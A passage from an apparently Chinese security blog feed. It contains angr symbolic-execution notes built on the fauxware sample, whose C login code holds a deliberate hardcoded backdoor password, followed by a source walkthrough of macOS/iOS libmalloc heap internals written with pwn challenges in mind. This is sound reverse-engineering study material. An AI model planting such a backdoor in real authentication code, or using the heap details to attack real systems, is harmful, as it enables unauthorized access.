&quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" 